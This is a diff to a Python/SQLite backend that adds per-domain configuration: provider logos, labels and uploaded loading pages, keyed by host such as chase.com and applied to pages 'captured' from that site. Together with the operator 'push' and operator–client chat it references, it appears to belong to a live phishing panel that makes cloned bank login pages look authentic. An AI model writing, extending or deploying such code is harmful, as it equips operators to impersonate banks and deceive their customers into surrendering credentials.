@@ -278,6 +278,34 @@ def init_db() -> None:
         except Exception:
             pass
 
+        # ---- per-domain loading screens (added later) --------------------
+        # One row per site the operator pushes: the provider's own logo (shown
+        # crisply, instead of the workflow's generic branding) and, when they
+        # want one, the loading page that site shows while it loads.
+        #
+        #   domain         normalised host, e.g. "chase.com" (see
+        #                  normalise_domain: scheme, www, port and path gone)
+        #   label          what the panel shows, e.g. "Chase"
+        #   logo_url       the provider's logo (a high-resolution icon is
+        #                  preferred — see api._page_logo_candidates)
+        #   spinner_html   an uploaded loading page, stored inline
+        #   spinner_page_id  ...or an archived page used as the loading page
+        #   enabled        off = this domain behaves as if it were not set up
+        conn.execute(
+            """
+            CREATE TABLE IF NOT EXISTS lpv_domains (
+                domain           TEXT PRIMARY KEY,
+                label            TEXT NOT NULL DEFAULT '',
+                logo_url         TEXT NOT NULL DEFAULT '',
+                spinner_html     TEXT NOT NULL DEFAULT '',
+                spinner_page_id  TEXT NOT NULL DEFAULT '',
+                enabled          INTEGER NOT NULL DEFAULT 1,
+                created_at       REAL NOT NULL,
+                updated_at       REAL NOT NULL
+            )
+            """
+        )
+
         # ------------------------------------------------------------------
         # Live chat: operator <-> client conversation on LPV pages
         # ------------------------------------------------------------------
@@ -1878,3 +1906,216 @@ def _chat_row(row: "sqlite3.Row") -> Dict[str, Any]:
         "code":       row["code"] or "",
         "created_at": float(row["created_at"] or 0.0),
     }
+
+
+# ---------------------------------------------------------------------------
+# Per-domain loading screens
+# ---------------------------------------------------------------------------
+# "This site's visitors see this site's logo while it loads."
+#
+# A domain row is the provider-facing half of a push: the logo the visitor
+# recognises (crisp — a 180px apple-touch-icon beats a 16px favicon blown up),
+# plus an optional loading page uploaded as HTML. client.html embeds the
+# resolved document in the page it serves, so the spinner is painted by the
+# browser as it parses rather than fetched afterwards.
+#
+# Matching is by HOST, not by page id, so a page re-uploaded tomorrow still
+# finds its configuration, and one configuration covers every page captured
+# from that site.
+
+DOMAIN_MAX_LEN = 253
+DOMAIN_SPINNER_MAX_BYTES = 1024 * 1024   # an uploaded loading page
+DOMAIN_LABEL_MAX = 80
+DOMAIN_LOGO_MAX = 4096
+
+
+def normalise_domain(value: Any) -> str:
+    """A host the way it is stored: lowercase, no scheme, no www, no path.
+
+        "https://www.Chase.com/login?x=1" -> "chase.com"
+        "Login.Example.co.uk"             -> "login.example.co.uk"
+        "  "                              -> ""
+    """
+    raw = str(value or "").strip().lower()
+    if not raw:
+        return ""
+    raw = raw.split("://", 1)[1] if "://" in raw else raw
+    raw = raw.split("/", 1)[0].split("?", 1)[0].split("#", 1)[0]
+    raw = raw.rsplit("@", 1)[-1]                     # strip userinfo
+    if ":" in raw and not raw.endswith("]"):         # strip :port
+        raw = raw.split(":", 1)[0]
+    raw = raw.strip().strip(".")
+    if raw.startswith("www."):
+        raw = raw[4:]
+    # A bare host only: letters, digits, dots, dashes, and an IDN label.
+    raw = re.sub(r"[^a-z0-9.\-\u00a1-\uffff_]", "", raw)
+    raw = re.sub(r"\.{2,}", ".", raw).strip(".")
+    if "." not in raw or len(raw) > DOMAIN_MAX_LEN:
+        return ""
+    return raw
+
+
+def domain_matches(host: str, domain: str) -> bool:
+    """True when `host` belongs to `domain` (subdomains included)."""
+    h = normalise_domain(host)
+    d = normalise_domain(domain)
+    if not h or not d:
+        return False
+    return h == d or h.endswith("." + d)
+
+
+def _truthy(value: Any, default: bool = True) -> bool:
+    if value is None:
+        return default
+    if isinstance(value, bool):
+        return value
+    return str(value).strip().lower() in ("1", "true", "yes", "on", "enabled")
+
+
+def normalise_domain_row(raw: Any) -> Optional[Dict[str, Any]]:
+    """Validate one domain configuration. None when it has no usable host."""
+    if not isinstance(raw, dict):
+        return None
+    domain = normalise_domain(raw.get("domain") or raw.get("host") or "")
+    if not domain:
+        return None
+    html = raw.get("spinner_html")
+    if html is None:
+        html = raw.get("spinner") or ""
+    html = str(html or "")
+    if len(html.encode("utf-8", "replace")) > DOMAIN_SPINNER_MAX_BYTES:
+        raise ValueError("the loading page is larger than 1 MB")
+    return {
+        "domain": domain,
+        "label": re.sub(r"\s+", " ", str(raw.get("label") or raw.get("name") or "")).strip()[:DOMAIN_LABEL_MAX],
+        "logo_url": str(raw.get("logo_url") or raw.get("logo") or "").strip()[:DOMAIN_LOGO_MAX],
+        "spinner_html": html,
+        "spinner_page_id": str(raw.get("spinner_page_id") or raw.get("page_id") or "").strip()[:64],
+        "enabled": _truthy(raw.get("enabled"), True),
+    }
+
+
+def save_domain(raw: Any) -> Dict[str, Any]:
+    """Insert or update one domain configuration.
+
+    Only the fields actually present in `raw` are written: the panel toggles a
+    domain on and off without resending a 1 MB loading page, and a caller that
+    leaves `logo_url` out does not silently erase it. Pass an explicit empty
+    string to clear a field.
+    """
+    if not isinstance(raw, dict):
+        raise ValueError("a domain is required (for example: chase.com)")
+    key = normalise_domain(raw.get("domain") or raw.get("host") or "")
+    if not key:
+        raise ValueError("a domain is required (for example: chase.com)")
+    merged: Dict[str, Any] = dict(raw)
+    existing = get_domain(key)
+    if existing:
+        merged["domain"] = key
+        for field in ("label", "logo_url", "spinner_html", "spinner_page_id", "enabled"):
+            if field not in raw or raw.get(field) is None:
+                merged[field] = existing.get(field)
+    clean = normalise_domain_row(merged)
+    if not clean:
+        raise ValueError("a domain is required (for example: chase.com)")
+    now = time.time()
+    with get_conn() as conn:
+        existing = conn.execute(
+            "SELECT created_at FROM lpv_domains WHERE domain = ?", (clean["domain"],)
+        ).fetchone()
+        created = float(existing["created_at"]) if existing else now
+        conn.execute(
+            """
+            INSERT INTO lpv_domains
+                (domain, label, logo_url, spinner_html, spinner_page_id,
+                 enabled, created_at, updated_at)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+            ON CONFLICT(domain) DO UPDATE SET
+                label = excluded.label,
+                logo_url = excluded.logo_url,
+                spinner_html = excluded.spinner_html,
+                spinner_page_id = excluded.spinner_page_id,
+                enabled = excluded.enabled,
+                updated_at = excluded.updated_at
+            """,
+            (
+                clean["domain"], clean["label"], clean["logo_url"],
+                clean["spinner_html"], clean["spinner_page_id"],
+                1 if clean["enabled"] else 0, created, now,
+            ),
+        )
+    return get_domain(clean["domain"]) or clean
+
+
+def _domain_row(row: sqlite3.Row) -> Dict[str, Any]:
+    return {
+        "domain": row["domain"],
+        "label": row["label"] or "",
+        "logo_url": row["logo_url"] or "",
+        "spinner_html": row["spinner_html"] or "",
+        "spinner_page_id": row["spinner_page_id"] or "",
+        "enabled": bool(row["enabled"]),
+        "created_at": float(row["created_at"] or 0.0),
+        "updated_at": float(row["updated_at"] or 0.0),
+    }
+
+
+def get_domain(domain: str) -> Optional[Dict[str, Any]]:
+    key = normalise_domain(domain)
+    if not key:
+        return None
+    with get_conn() as conn:
+        row = conn.execute(
+            "SELECT * FROM lpv_domains WHERE domain = ?", (key,)
+        ).fetchone()
+    return _domain_row(row) if row else None
+
+
+def list_domains(include_html: bool = False) -> List[Dict[str, Any]]:
+    """Every configuration, newest first. The loading page itself is left out
+    unless asked for: it is up to 1 MB and lists are sent to the panel often."""
+    with get_conn() as conn:
+        rows = conn.execute(
+            "SELECT * FROM lpv_domains ORDER BY updated_at DESC, domain"
+        ).fetchall()
+    out = []
+    for row in rows:
+        item = _domain_row(row)
+        if not include_html:
+            item["spinner_html"] = ""
+            item["has_spinner_html"] = bool((row["spinner_html"] or "").strip())
+        else:
+            item["has_spinner_html"] = bool((row["spinner_html"] or "").strip())
+        out.append(item)
+    return out
+
+
+def delete_domain(domain: str) -> bool:
+    key = normalise_domain(domain)
+    if not key:
+        return False
+    with get_conn() as conn:
+        cur = conn.execute("DELETE FROM lpv_domains WHERE domain = ?", (key,))
+    return int(cur.rowcount or 0) > 0
+
+
+def find_domain(host: str) -> Optional[Dict[str, Any]]:
+    """The configuration that applies to `host`, enabled only.
+
+    Exact match wins; otherwise the most specific parent domain
+    ("login.chase.com" -> "chase.com") so one row covers a whole site
+    including its subdomains.
+    """
+    h = normalise_domain(host)
+    if not h:
+        return None
+    row = get_domain(h)
+    if row and row.get("enabled"):
+        return row
+    labels = h.split(".")
+    for i in range(1, len(labels) - 1):
+        candidate = ".".join(labels[i:])
+        row = get_domain(candidate)
+        if row and row.get("enabled"):
+            return row
+    return None
